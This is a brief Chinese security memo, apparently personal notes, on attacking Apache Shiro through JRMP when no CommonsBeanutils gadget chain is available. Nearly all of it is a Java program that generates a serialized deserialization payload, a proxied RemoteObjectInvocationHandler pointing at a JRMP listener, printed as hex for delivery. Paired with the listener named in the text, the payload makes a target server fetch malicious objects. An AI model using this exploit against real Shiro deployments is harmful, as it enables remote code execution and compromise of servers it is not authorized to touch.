# shiro在没有cb链的情况下

可以通过jrmp来打。
也就是payload/JRMPClient（监听指定端口） + exploit/JRMPListener（向指定端口发送恶意数据）

```

import sun.rmi.server.UnicastRef;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.RemoteObjectInvocationHandler;

public class Demo {
    public static UnicastRef generateUnicastRef(String host, int port) {
        java.rmi.server.ObjID objId = new java.rmi.server.ObjID();
        sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);
        sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);
        return new sun.rmi.server.UnicastRef(liveRef);
    }

    public static void main(String[] args) throws Exception{
        //获取UnicastRef对象
        String jrmpListenerHost = "127.0.0.1";
        int jrmpListenerPort = 1299;
        UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);

        //通过构造函数封装进入RemoteObjectInvocationHandler
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);

        //使用动态代理改变obj的类型变为Registry，这是Remote类型的子类
        //所以接下来bind可以填入proxy
        Registry proxy = (Registry) Proxy.newProxyInstance(Demo.class.getClassLoader(),
                new Class[]{Registry.class}, obj);

        ByteArrayOutputStream ser = new ByteArrayOutputStream();
        ObjectOutputStream oser = new ObjectOutputStream(ser);
        oser.writeUTF("SJTU");
        oser.writeInt(1896);
        oser.writeObject(proxy);
        oser.close();

        System.out.println(bytesTohexString(ser.toByteArray()));
    }

    public static String bytesTohexString(byte[] bytes) {
        if (bytes == null)
            return null;
        StringBuilder ret = new StringBuilder(2 * bytes.length);
        for (int i = 0; i < bytes.length; i++) {
            int b = 0xF & bytes[i] >> 4;
            ret.append("0123456789abcdef".charAt(b));
            b = 0xF & bytes[i];
            ret.append("0123456789abcdef".charAt(b));
        }
        return ret.toString();
    }
}
```

